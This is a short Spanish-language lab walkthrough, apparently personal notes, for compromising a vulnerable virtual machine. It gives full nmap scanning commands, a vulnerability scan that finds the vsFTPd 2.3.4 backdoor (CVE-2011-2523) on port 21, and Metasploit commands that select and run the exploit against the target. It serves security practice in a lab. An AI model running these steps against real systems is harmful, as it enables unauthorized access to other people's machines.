```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.9 -oN escaneo
nmap --script "vuln" -p 21 10.0.2.9
msfdb init && msfconsole
```
Escaneamos la maquina victima con nmap![[Pasted image 20240228170144.png]]
Como hay muchos puertos nos centraremos en el 21![[Pasted image 20240228170127.png]]
Buscamos si hay alguna vulnerabilidad usando vuln y nmap y encontramos CVE-2011-2523![[Pasted image 20240228170438.png]]
Ahora abriremos metasploit para atacar a la máquina en base a su CVE y encontramos un exploit![[Pasted image 20240228170645.png]]

```metasploit
search vsFTPd 2.3.4
use 0
show options
set RHOSTS 10.0.2.9
run
```
